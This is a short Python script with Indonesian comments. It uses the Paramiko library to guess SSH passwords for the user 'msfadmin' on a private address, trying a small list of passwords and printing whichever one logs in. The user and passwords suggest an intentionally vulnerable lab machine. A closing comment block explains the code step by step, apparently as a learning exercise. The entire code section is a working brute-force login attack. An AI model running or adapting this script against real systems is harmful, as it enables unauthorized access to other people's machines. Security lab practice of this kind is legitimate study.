# Paramiko adalah library untuk implementasi dan manajemen akses SSH
import paramiko

host = "10.0.0.139"
pengguna = "msfadmin"
senhas = ["root", "toor", "msfadmin"]

# Membuat objek untuk terhubung ke server SSH
koneksi = paramiko.SSHClient()

# Menambahkan kebijakan kunci host secara otomatis
koneksi.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Iterasi untuk mencoba kata sandi dalam daftar
for kata_sandi in senhas:
    try:
        # Melakukan koneksi ke server SSH. Jika tidak bisa karena kata sandi salah, akan menimbulkan pengecualian
        koneksi.connect(host, username=pengguna, password=kata_sandi, timeout=1)
    except:
        pass
    else:
        print("Pengguna:", pengguna)
        print("Kata Sandi:", kata_sandi)
        break
    finally:
        koneksi.close()

# ========================================================================================== 
# Kesimpulan : 
# Program ini menggunakan library Paramiko untuk mengimplementasikan dan mengelola akses SSH. Tujuannya adalah untuk mencoba beberapa kata sandi yang telah ditentukan pada sebuah host dengan username tertentu. 

# Kode program ini terlebih dahulu mendefinisikan host yang akan diakses, username yang akan digunakan, dan daftar kata sandi yang akan dicoba. Kemudian, sebuah objek `SSHClient` dari Paramiko dibuat untuk melakukan koneksi SSH. Kebijakan `AutoAddPolicy()` digunakan untuk menambahkan kunci host secara otomatis.

# Selanjutnya, program melakukan iterasi melalui daftar kata sandi yang telah ditentukan. Pada setiap iterasi, program mencoba melakukan koneksi SSH menggunakan username dan kata sandi yang diberikan. Jika koneksi berhasil, program mencetak username dan kata sandi yang berhasil digunakan, kemudian menghentikan iterasi dengan menggunakan `break`.

# Jadi, tujuan dari program ini adalah untuk mencoba beberapa kata sandi yang telah ditentukan pada sebuah host dengan username tertentu melalui koneksi SSH menggunakan library Paramiko.
